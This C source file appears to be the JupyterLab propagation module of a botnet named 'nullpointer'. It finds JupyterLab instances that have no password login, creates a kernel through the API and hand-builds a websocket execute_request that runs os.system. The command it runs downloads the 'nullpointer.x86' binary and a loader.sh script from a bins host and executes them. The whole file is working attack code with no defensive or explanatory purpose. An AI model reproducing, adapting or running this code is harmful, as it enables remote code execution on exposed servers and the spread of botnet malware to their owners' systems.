#define _GNU_SOURCE
#ifdef NP_TELNET

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <errno.h>

#include "includes.h"
#include "exploit_common.h"
#include "util.h"
#include "rand.h"
#include "jupyter.h"

#define JUPYTER_PORT 8888
#define JUPYTER_BODY_MAX (256 * 1024)
#define JUPYTER_RECV_BUF 65536
#define JUPYTER_BINS_HOST BINS_DOMAIN_DEFAULT
#define JUPYTER_LOADER_HOST BINS_DOMAIN_DEFAULT

static void sha1_block(uint32_t *h, const unsigned char *block)
{
	uint32_t w[80], a, b, c, d, e, f, k, t;
	int i;
	for (i = 0; i < 16; i++)
		w[i] = ((uint32_t)block[i*4]<<24)|(block[i*4+1]<<16)|(block[i*4+2]<<8)|block[i*4+3];
	for (i = 16; i < 80; i++) {
		t = w[i-3]^w[i-8]^w[i-14]^w[i-16];
		w[i] = (t<<1)|(t>>31);
	}
	a = h[0]; b = h[1]; c = h[2]; d = h[3]; e = h[4];
	for (i = 0; i < 80; i++) {
		if (i < 20) { f = (b&c)|((~b)&d); k = 0x5A827999; }
		else if (i < 40) { f = b^c^d; k = 0x6ED9EBA1; }
		else if (i < 60) { f = (b&c)|(b&d)|(c&d); k = 0x8F1BBCDC; }
		else { f = b^c^d; k = 0xCA62C1D6; }
		t = ((a<<5)|(a>>27)) + f + e + k + w[i];
		e = d; d = c; c = (b<<30)|(b>>2); b = a; a = t;
	}
	h[0] += a; h[1] += b; h[2] += c; h[3] += d; h[4] += e;
}

static void sha1(const unsigned char *data, size_t len, unsigned char *out)
{
	uint32_t h[5] = {0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0};
	unsigned char buf[128];
	uint64_t total_bits = (uint64_t)len * 8;
	size_t i;

	while (len >= 64) {
		sha1_block(h, data);
		data += 64; len -= 64;
	}
	util_memcpy(buf, data, len);
	buf[len++] = 0x80;
	if (len > 56) {
		while (len < 64) buf[len++] = 0;
		sha1_block(h, buf);
		len = 0;
		util_zero(buf, 64);
	}
	while (len < 56) buf[len++] = 0;
	for (i = 0; i < 8; i++) buf[63 - i] = (unsigned char)(total_bits >> (i * 8));
	sha1_block(h, buf);
	for (i = 0; i < 5; i++) {
		out[i*4] = (unsigned char)(h[i] >> 24);
		out[i*4+1] = (unsigned char)(h[i] >> 16);
		out[i*4+2] = (unsigned char)(h[i] >> 8);
		out[i*4+3] = (unsigned char)h[i];
	}
}

static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static void b64enc(const unsigned char *in, int len, char *out)
{
	int i, j = 0;
	for (i = 0; i < len; i += 3) {
		uint32_t v = in[i] << 16;
		if (i+1 < len) v |= in[i+1] << 8;
		if (i+2 < len) v |= in[i+2];
		out[j++] = b64[(v>>18)&63];
		out[j++] = b64[(v>>12)&63];
		out[j++] = (i+1 < len) ? b64[(v>>6)&63] : '=';
		out[j++] = (i+2 < len) ? b64[v&63] : '=';
	}
	out[j] = 0;
}

static int jupyter_connect(ipv4_t ip, uint16_t port)
{
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) return -1;
	fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
	struct sockaddr_in dst = { .sin_family = AF_INET, .sin_addr.s_addr = ip, .sin_port = htons(port) };
	if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) != 0) {
		fd_set wfds;
		struct timeval tv = { 5, 0 };
		FD_ZERO(&wfds); FD_SET(fd, &wfds);
		if (select(fd + 1, NULL, &wfds, NULL, &tv) <= 0) { close(fd); return -1; }
		int err; socklen_t len = sizeof(err);
		if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &len) != 0 || err != 0) { close(fd); return -1; }
	}
	fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) & ~O_NONBLOCK);
	return fd;
}

static int jupyter_http_recv(int fd, char *buf, int bufsz, int *body_off)
{
	int n = 0, total = 0;
	while (total < bufsz - 1) {
		n = recv(fd, buf + total, bufsz - 1 - total, 0);
		if (n <= 0) break;
		total += n;
		int sep = util_memsearch(buf, total, "\r\n\r\n", 4);
		if (sep > 0 && body_off) *body_off = sep;
		if (n < 4096) break;
	}
	buf[total] = 0;
	return total;
}

static BOOL jupyter_is_open(const char *body, int len)
{
	if (util_stristr(body, len, "jupyterlab") == -1) return FALSE;
	if (util_memsearch(body, len, "id=\"jupyter-config-data\"", 24) == -1 &&
	    util_stristr(body, len, "data-jupyter-lite-root") == -1)
		return FALSE;
	if (util_memsearch(body, len, "type=\"password\"", 14) != -1 ||
	    util_stristr(body, len, "name=\"password\"") != -1 ||
	    util_stristr(body, len, "login_submit") != -1)
		return FALSE;
	return TRUE;
}

static int jupyter_extract_kernel_id(const char *body, int len, char *out, int outsz)
{
	int p = util_memsearch(body, len, "\"id\":\"", 6);
	if (p < 0) return -1;
	int start = p;
	int end = start;
	while (end < len && body[end] != '"' && body[end] != '\0' && body[end] != ',' && body[end] != '}') end++;
	if (end - start <= 0 || end - start >= outsz) return -1;
	util_memcpy(out, body + start, end - start);
	out[end - start] = 0;
	return end - start;
}

static BOOL jupyter_create_kernel(int fd, ipv4_t ip, uint16_t port, char *kernel_id, int id_sz)
{
	struct in_addr ia; ia.s_addr = ip;
	char host[64];
	{ int a = (ip>>24)&0xff, b = (ip>>16)&0xff, c = (ip>>8)&0xff, d = ip&0xff;
	  snprintf(host, sizeof(host), "%d.%d.%d.%d", d, c, b, a); }
	char req[512];
	int req_len = snprintf(req, sizeof(req),
		"POST /api/kernels HTTP/1.1\r\n"
		"Host: %s:%d\r\n"
		"Content-Type: application/json\r\n"
		"Content-Length: 2\r\n"
		"Connection: close\r\n"
		"\r\n"
		"{}",
		host, port);
	if (send(fd, req, req_len, MSG_NOSIGNAL) != req_len) return FALSE;
	char rbuf[JUPYTER_RECV_BUF];
	int body_off = 0;
	int n = jupyter_http_recv(fd, rbuf, sizeof(rbuf), &body_off);
	close(fd);
	if (n < 20) return FALSE;
	if (util_memsearch(rbuf, n, "201", 3) == -1 && util_memsearch(rbuf, n, "200", 3) == -1)
		return FALSE;
	return jupyter_extract_kernel_id(rbuf + body_off, n - body_off, kernel_id, id_sz) > 0;
}

static void ws_mask(char *payload, int len, unsigned char *key)
{
	int i;
	for (i = 0; i < len; i++) payload[i] ^= key[i & 3];
}

static BOOL jupyter_ws_execute(int fd, ipv4_t ip, uint16_t port, const char *kernel_id, const char *code)
{
	unsigned char key_raw[16];
	char key_b64[32];
	rand_str((char *)key_raw, 16);
	b64enc(key_raw, 16, key_b64);

	struct in_addr ia; ia.s_addr = ip;
	char host[64];
	{ int a = (ip>>24)&0xff, b = (ip>>16)&0xff, c = (ip>>8)&0xff, d = ip&0xff;
	  snprintf(host, sizeof(host), "%d.%d.%d.%d", d, c, b, a); }

	char msg_id[40];
	rand_alphastr((uint8_t *)msg_id, 24);
	msg_id[24] = 0;

	char handshake[1024];
	int hs_len = snprintf(handshake, sizeof(handshake),
		"GET /api/kernels/%s/channels HTTP/1.1\r\n"
		"Host: %s:%d\r\n"
		"Upgrade: websocket\r\n"
		"Connection: Upgrade\r\n"
		"Sec-WebSocket-Key: %s\r\n"
		"Sec-WebSocket-Version: 13\r\n"
		"\r\n",
		kernel_id, host, port, key_b64);
	if (send(fd, handshake, hs_len, MSG_NOSIGNAL) != hs_len) return FALSE;

	char rbuf[2048];
	int n = recv(fd, rbuf, sizeof(rbuf) - 1, 0);
	if (n <= 0) return FALSE;
	rbuf[n] = 0;
	if (util_memsearch(rbuf, n, "101", 3) == -1) return FALSE;

	unsigned char key_concat[128];
	int klen = snprintf((char *)key_concat, sizeof(key_concat), "%s258EAFA5-E916-4747-8B31-334B6D3B9E0A", key_b64);
	unsigned char accept_hash[20];
	sha1(key_concat, klen, accept_hash);
	char accept_b64[32];
	b64enc(accept_hash, 20, accept_b64);

	char exec_json[1024];
	int jlen = snprintf(exec_json, sizeof(exec_json),
		"{\"header\":{\"msg_id\":\"%s\",\"msg_type\":\"execute_request\",\"username\":\"\",\"session\":\"\",\"date\":\"\"},"
		"\"parent_header\":{},\"metadata\":{},\"content\":{\"code\":\"import os;os.system(\\\"%s\\\")\","
		"\"silent\":true,\"store_history\":false,\"user_expressions\":{},\"allow_stdin\":false}}",
		msg_id, code);

	unsigned char mask_key[4];
	rand_str((char *)mask_key, 4);

	int payload_len = jlen;
	unsigned char frame[8 + 1024];
	int frame_len = 0;
	frame[0] = 0x81;
	if (payload_len < 126) {
		frame[1] = 0x80 | (payload_len & 0xff);
		frame_len = 2;
	} else if (payload_len < 65536) {
		frame[1] = 0x80 | 126;
		frame[2] = (payload_len >> 8) & 0xff;
		frame[3] = payload_len & 0xff;
		frame_len = 4;
	} else return FALSE;
	util_memcpy(frame + frame_len, mask_key, 4);
	frame_len += 4;
	util_memcpy(frame + frame_len, exec_json, payload_len);
	ws_mask((char *)(frame + frame_len), payload_len, mask_key);
	frame_len += payload_len;

	if (send(fd, frame, frame_len, MSG_NOSIGNAL) != frame_len) return FALSE;
	return TRUE;
}

BOOL exploit_jupyter_try(ipv4_t ip, uint16_t port)
{
	int fd = jupyter_connect(ip, port);
	if (fd < 0) return FALSE;

	struct in_addr ia; ia.s_addr = ip;
	char host[64];
	{ int a = (ip>>24)&0xff, b = (ip>>16)&0xff, c = (ip>>8)&0xff, d = ip&0xff;
	  snprintf(host, sizeof(host), "%d.%d.%d.%d", d, c, b, a); }

	char req[512];
	int req_len = snprintf(req, sizeof(req),
		"GET /lab HTTP/1.1\r\n"
		"Host: %s:%d\r\n"
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/121.0.0.0\r\n"
		"Connection: close\r\n"
		"\r\n",
		host, port);
	if (send(fd, req, req_len, MSG_NOSIGNAL) != req_len) { close(fd); return FALSE; }

	char rbuf[JUPYTER_RECV_BUF];
	int body_off = 0;
	int n = jupyter_http_recv(fd, rbuf, sizeof(rbuf), &body_off);
	close(fd);
	if (n < 50) return FALSE;

	int status_off = util_memsearch(rbuf, n, "HTTP/1", 7);
	if (status_off < 0) return FALSE;
	if (util_memsearch(rbuf + status_off, 12, " 301", 4) != -1 ||
	    util_memsearch(rbuf + status_off, 12, " 302", 4) != -1) {
		int loc = util_stristr(rbuf, n, "ocation:");
		if (loc != -1) {
			char *path = rbuf + loc;
			while (*path == ' ' || *path == '\t') path++;
			char *end = path;
			while (*end && *end != '\r' && *end != '\n') end++;
			if (end > path && (path[0] == '/' || util_stristr(path, end - path, "http") != -1)) {
				fd = jupyter_connect(ip, port);
				if (fd < 0) return FALSE;
				char path_buf[256];
				int pl = end - path;
				if (pl >= (int)sizeof(path_buf)) pl = sizeof(path_buf) - 1;
				util_memcpy(path_buf, path, pl);
				path_buf[pl] = 0;
				req_len = snprintf(req, sizeof(req),
					"GET %s HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
					path_buf, host, port);
				if (send(fd, req, req_len, MSG_NOSIGNAL) == req_len) {
					body_off = 0;
					n = jupyter_http_recv(fd, rbuf, sizeof(rbuf), &body_off);
				}
				close(fd);
			}
		}
	}

	const char *body = rbuf + body_off;
	int body_len = n - body_off;
	if (body_len <= 0) return FALSE;
	if (util_memsearch(rbuf, n, " 200 ", 5) == -1) return FALSE;
	if (!jupyter_is_open(body, body_len)) return FALSE;

	char kernel_id[128];
	fd = jupyter_connect(ip, port);
	if (fd < 0) return FALSE;
	if (!jupyter_create_kernel(fd, ip, port, kernel_id, sizeof(kernel_id)))
		return FALSE;

	fd = jupyter_connect(ip, port);
	if (fd < 0) return FALSE;

	char payload[512];
	snprintf(payload, sizeof(payload),
		"wget http://%s/bins/nullpointer.x86 -O /tmp/nullpointer && chmod +x /tmp/nullpointer && /tmp/nullpointer & wget -qO- http://%s/bins/loader.sh | sh",
		JUPYTER_BINS_HOST, JUPYTER_LOADER_HOST);

	BOOL ok = jupyter_ws_execute(fd, ip, port, kernel_id, payload);
	close(fd);
	return ok;
}

#endif
